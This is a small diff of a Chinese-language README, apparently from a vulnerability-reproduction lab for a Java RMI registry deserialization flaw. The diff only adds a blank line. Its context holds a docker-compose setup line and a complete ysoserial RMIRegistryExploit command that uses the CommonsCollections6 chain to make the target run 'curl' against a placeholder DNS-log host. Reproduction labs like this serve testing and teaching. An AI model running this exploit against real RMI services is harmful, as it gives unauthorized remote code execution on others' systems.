@@ -18,6 +18,7 @@ docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi
 ## 漏洞复现
 
 通过ysoserial的exploit包中的RMIRegistryExploit进行攻击
+
 ```bash
 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 "curl your-dnslog-server"
 ```
